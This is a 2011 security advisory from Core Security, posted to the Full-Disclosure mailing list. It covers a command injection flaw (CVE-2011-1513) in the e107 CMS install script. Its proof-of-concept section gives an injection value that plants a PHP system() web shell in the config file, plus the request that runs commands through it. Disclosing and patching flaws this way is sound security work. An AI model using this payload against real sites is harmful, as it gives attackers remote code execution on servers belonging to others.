
Date: Mon, 24 Oct 2011 13:04:39 -0300
From: Core Security Technologies Advisories <advisories@...esecurity.com>
To: full-disclosure@...ts.grok.org.uk
Subject: CORE-2011-0810 - E107 CMS Script Command Injection


-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1

Core Security - Corelabs Advisory
http://corelabs.coresecurity.com/


e107 CMS Script Command Injection


1. *Advisory Information*

Title: e107 CMS Script Command Injection
Advisory ID: CORE-2011-0810
Advisory URL:
http://www.coresecurity.com/content/e107-cms-script-command-injection
Date published: 2011-10-24
Date of last update: 2011-10-24
Vendors contacted: e107
Release mode: Coordinated release

2. *Vulnerability Information*

Class: OS command injection [CWE-78]
Impact: Code execution
Remotely Exploitable: Yes
Locally Exploitable: No
CVE Name: CVE-2011-1513

3. *Vulnerability Description*

When the install script for e107 CMS has not been removed, an attacker
can "reinstall" the application using arbitrary parameters.
If the attacker puts a valid MySql server followed a semicolon and PHP
code, this will be executed when the config file gets requested.
This parameters are stored in the config file "e107_config.php".

4. *Vulnerable packages*
 . e107 0.7.24       
 . Older versions are probably affected too, but they were not checked.

5. *Vendor Information, Solutions and Workarounds*
        
e107's team has issued patch for this issue in the revision 12375 [1] of
its SVN repository. Also the development version of e107 was patched in
the revision 12376 [2]
    

6. *Credits*

This vulnerability was discovered and researched by Matt Bergin and
Matias Blanco.
The publication of this advisory was coordinated by Fernando Russ.

7. *Technical Description / Proof of Concept Code*

A possible value for the MySql parameter could be:

/-----
localhost:63306';system($_GET['cmd']);$a='1

- -----/
Then, when the e107_config.php page is requested like this
http://www.example.com/e107_config.php?cmd=id, the command id is going
to be executed.
 

8. *Report Timeline*
          
. 2011-10-03:
    Technical details sent to the Vendor.
. 2011-10-03:
    The e107 security team asks Core for a technical description
    of the vulnerability.
. 2011-10-03:
    Core sends the technical description of the vulnerability
. 2011-10-21:
    The e107 security team reports that the vulnerability was fixed.
    And is now live in the SVN for wider testing. (changeset 12375 and
changeset 12376)
. 2011-10-21:
    Core provides the CVE for this vulnerability.
. 2011-10-24:
    Advisory CORE-2011-0810 is published.
 

9. *References*
    
[1]
      SVN reference to the patch for this issue in e107 (v0.7)
     
http://e107.svn.sourceforge.net/viewvc/e107?view=revision&revision=12375
      
[2]
      SVN reference to the patch for this issue in e107 (v0.8) (devel)     
     
http://e107.svn.sourceforge.net/viewvc/e107?view=revision&revision=12376
    
10. *About CoreLabs*

CoreLabs, the research center of Core Security Technologies, is charged
with anticipating the future needs and requirements for information
security technologies.
We conduct our research in several important areas of computer security
including system vulnerabilities, cyber attack planning and simulation,
source code auditing, and cryptography. Our results include problem
formalization, identification of vulnerabilities, novel solutions and
prototypes for new technologies. CoreLabs regularly publishes security
advisories, technical papers, project information and shared software
tools for public use at:
http://corelabs.coresecurity.com.

11. *About Core Security Technologies*

Core Security Technologies enables organizations to get ahead of threats
with security test and measurement solutions that continuously identify
and demonstrate real-world exposures to their most critical assets. Our
customers can gain real visibility into their security standing, real
validation of their security controls, and real metrics to more
effectively secure their organizations.

Core Security's software solutions build on over a decade of trusted
research and leading-edge threat expertise from the company's Security
Consulting Services, CoreLabs and Engineering groups. Core Security
Technologies can be reached at +1 (617) 399-6980 or on the Web at:
http://www.coresecurity.com.
 

12. *Disclaimer*

The contents of this advisory are copyright
(c) 2011 Core Security Technologies and (c) 2011 CoreLabs,
and are licensed under a Creative Commons
Attribution Non-Commercial Share-Alike 3.0 (United States) License:
http://creativecommons.org/licenses/by-nc-sa/3.0/us/

13. *PGP/GPG Keys*

This advisory has been signed with the GPG key of Core Security
Technologies advisories
team, which is available for download at
http://www.coresecurity.com/files/attachments/core_security_advisories.asc.

-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.11 (GNU/Linux)
Comment: Using GnuPG with Mozilla - http://enigmail.mozdev.org/

iEYEARECAAYFAk6ljIgACgkQyNibggitWa113wCeISjoKNw2ab7IgWEJyvf3uU3U
qIEAoJspzi1JyLPBaD9VrKUxJ2gmzr6H
=UtMA
-----END PGP SIGNATURE-----

_______________________________________________
Full-Disclosure - We believe in it.
Charter: http://lists.grok.org.uk/full-disclosure-charter.html
Hosted and sponsored by Secunia - http://secunia.com/
